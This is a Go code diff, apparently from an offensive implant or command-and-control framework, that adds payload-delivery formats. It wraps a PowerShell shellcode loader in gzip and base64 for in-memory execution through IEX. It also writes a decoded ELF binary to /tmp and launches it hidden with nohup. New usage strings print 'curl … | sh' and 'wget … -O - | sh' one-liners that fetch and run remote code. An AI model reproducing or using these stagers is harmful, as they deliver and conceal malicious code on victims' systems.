@@ -62,10 +62,10 @@ var SupportedFormats = Formatter{
 		Extension: ".ps1", Desc: "PowerShell script format", Converter: toPowerShell,
 	},
 	consts.FormatHexOneLine: {
-		Extension: ".hex", Desc: "hexadecimal format", Converter: toHexOneLine,
+		Extension: ".hex", Desc: "hexadecimal oneline format", Converter: toHexOneLine,
 	},
 	consts.FormatHexMultiLine: {
-		Extension: ".hex", Desc: "hexadecimal format", Converter: toHexMultiLine,
+		Extension: ".hex", Desc: "hexadecimal multiline format", Converter: toHexMultiLine,
 	},
 	consts.FormatNum: {
 		Extension: ".txt", Desc: "numeric format", Converter: toNum,
@@ -88,12 +88,20 @@ var SupportedFormats = Formatter{
 	consts.FormatPowerShellRemote: {
 		Extension: ".ps1", Desc: "Execute ShellCode By PowerShell",
 		SupportRemote: true,
+		Converter:     toPowershellRemote,
 		Usage:         PowershellRemoteUsage,
 	},
 	consts.FormatCurlRemote: {
 		Extension: ".bash", Desc: "Execute ELF by curl",
 		SupportRemote: true,
+		Converter:     toShRemote,
 		Usage:         CurlRemoteUsage,
+	},
+	consts.FormatWgetRemote: {
+		Extension: ".bash", Desc: "Execute ELF by wget",
+		SupportRemote: true,
+		Converter:     toShRemote,
+		Usage:         WgetRemoteUsage,
 	},
 }
 
@@ -139,7 +147,15 @@ func ConvertArtifact(artifact *clientpb.Artifact, format string) (*clientpb.Arti
 	if format == "" || format == consts.FormatExecutable {
 		return artifact, nil
 	}
-
+	if artifact.Platform != consts.Windows {
+		convert, err := Convert(artifact.Bin, format)
+		if err != nil {
+			return nil, err
+		}
+		artifact.Bin = convert.Data
+		artifact.Format = format
+		return artifact, nil
+	}
 	filename := filepath.Join(encoders.UUID())
 	if err := os.WriteFile(filename, artifact.Bin, 0644); err != nil {
 		return nil, err
@@ -457,10 +473,14 @@ If ([IntPtr]::size -eq 8) {
 }
 `
 	ps_x64_data_0 := fmt.Sprintf(ps_x64_template_0, base64Shellcode)
-	//ps_x64_template_1 := `$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%s"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();`
-	//ps_x64_template_0_base64 := base64.StdEncoding.EncodeToString([]byte(ps_x64_data_0))
-	//ps_x64_data_1 := fmt.Sprintf(ps_x64_template_1, ps_x64_template_0_base64)
-	return []byte(ps_x64_data_0)
+	ps_x64_data_0_gzip, error := encoders.GzipBuf([]byte(ps_x64_data_0))
+	if error != nil {
+		return []byte(ps_x64_data_0)
+	}
+	ps_x64_data_0_gzip_base64 := base64.StdEncoding.EncodeToString(ps_x64_data_0_gzip)
+	ps_x64_template_1 := `$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%s"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();`
+	ps_x64_data_1 := fmt.Sprintf(ps_x64_template_1, ps_x64_data_0_gzip_base64)
+	return []byte(ps_x64_data_1)
 }
 
 func PowershellRemoteUsage(powershellURL string) string {
@@ -468,8 +488,25 @@ func PowershellRemoteUsage(powershellURL string) string {
 	return fmt.Sprintf(template, powershellURL)
 }
 
+func toShRemote(data []byte) []byte {
+	tempName := encoders.UUID()
+	base64_data := base64.StdEncoding.EncodeToString(data)
+	template := `export f_name='%s'
+echo '%s' | base64 -d > /tmp/$f_name
+export PATH=/tmp:$PATH
+chmod +x /tmp/$f_name
+nohup $f_name > /dev/null 2>&1 &
+`
+	return []byte(fmt.Sprintf(template, tempName, base64_data))
+}
+
 func CurlRemoteUsage(url string) string {
-	template := `sh -c "curl %s | nohup bash &"`
+	template := `sh -c "curl %s | sh "`
+	return fmt.Sprintf(template, url)
+}
+
+func WgetRemoteUsage(url string) string {
+	template := `sh -c "wget %s -O - | sh "`
 	return fmt.Sprintf(template, url)
 }
 
